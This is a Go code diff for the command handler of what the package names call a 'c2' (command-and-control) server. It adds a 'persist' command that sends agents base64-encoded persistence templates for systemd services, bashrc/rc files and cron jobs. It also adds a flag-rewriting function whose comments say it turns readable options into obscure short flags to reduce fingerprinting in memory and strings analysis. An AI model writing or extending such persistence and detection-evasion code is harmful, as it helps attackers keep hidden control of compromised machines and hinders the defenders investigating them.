@@ -2,8 +2,10 @@
 package handlers
 
 import (
+	"c2/internal/templates"
 	"c2/internal/websocket/hub"
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -486,6 +488,13 @@ func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
 		}
 	}
 
+	// Handle persist commands - inject server-side templates and transform flags
+	if strings.HasPrefix(data.Command, "persist") {
+		log.Printf("Processing persist command for agent: %s - injecting templates", data.AgentID)
+		data.Data = injectPersistenceTemplate(data.Command)
+		data.Command = transformPersistFlags(data.Command)
+	}
+
 	// Use message username if provided (e.g., from REST API proxy), otherwise fall back to client username
 	username := data.Username
 	if username == "" {
@@ -824,4 +833,108 @@ func marshalResponse(resp Response) []byte {
 		return []byte(`{"status": "error", "message": "Failed to generate response"}`)
 	}
 	return jsonResp
+}
+
+// injectPersistenceTemplate parses a persist command and returns base64-encoded template data
+func injectPersistenceTemplate(command string) string {
+	parts := strings.Fields(command)
+	if len(parts) < 2 {
+		return ""
+	}
+
+	method := parts[1] // "systemd", "bashrc", etc.
+
+	var template *templates.PersistenceTemplate
+
+	switch method {
+	case "systemd":
+		// Parse flags from command: persist systemd [--user] [--name <name>]
+		userService := false
+		serviceName := ""
+
+		for i := 2; i < len(parts); i++ {
+			switch parts[i] {
+			case "--user":
+				userService = true
+			case "--name":
+				if i+1 < len(parts) {
+					serviceName = parts[i+1]
+					i++
+				}
+			}
+		}
+
+		template = templates.GetLinuxSystemdTemplate(serviceName, "", userService)
+		log.Printf("Injecting systemd template: serviceName=%s, userService=%v", serviceName, userService)
+
+	case "bashrc", "rc":
+		// "bashrc" is Linux, "rc" is Darwin - same template structure
+		template = templates.GetLinuxBashrcTemplate()
+		log.Printf("Injecting bashrc/rc template for method: %s", method)
+
+	case "cron":
+		// Cron persistence (Linux) - includes spool, crond, periodic, anacron, timer methods
+		template = templates.GetLinuxCronTemplate()
+		log.Printf("Injecting cron template for persist cron command")
+
+	default:
+		// Unknown method, return empty (agent will use hardcoded fallback)
+		log.Printf("Unknown persist method '%s', no template injection", method)
+		return ""
+	}
+
+	if template == nil {
+		return ""
+	}
+
+	// Serialize to JSON and base64 encode
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize persistence template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected persistence template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// transformPersistFlags transforms user-friendly persist flags to short obscure flags
+// This reduces the fingerprinting surface in agent memory
+func transformPersistFlags(command string) string {
+	// Flag transformations (user-friendly → obscure)
+	// These short flags are less obvious in memory/strings analysis
+	// Order matters: longer flags first to avoid partial matches (e.g., --files before --file)
+	replacements := []struct {
+		from string
+		to   string
+	}{
+		// Payload wrapper flags (persist bashrc)
+		{"--raw", "-1"},
+		{"--no-nohup", "-2"},
+		{"--no-silence", "-3"},
+		{"--no-pgrep", "-4"},
+		{"--no-sudo-check", "-5"},
+		// Common flags
+		{"--command", "-6"},
+		{"--files", "-7"},
+		{"--file", "-8"},
+		{"--user", "-9"},
+		{"--name", "-n"},
+		{"--all", "-a"},
+		// Persist-cron specific flags
+		{"--method", "-m"},
+		{"--interval", "-i"},
+	}
+
+	result := command
+	for _, r := range replacements {
+		result = strings.ReplaceAll(result, r.from, r.to)
+	}
+
+	if result != command {
+		log.Printf("Transformed persist flags: %s → %s", command, result)
+	}
+
+	return result
 }
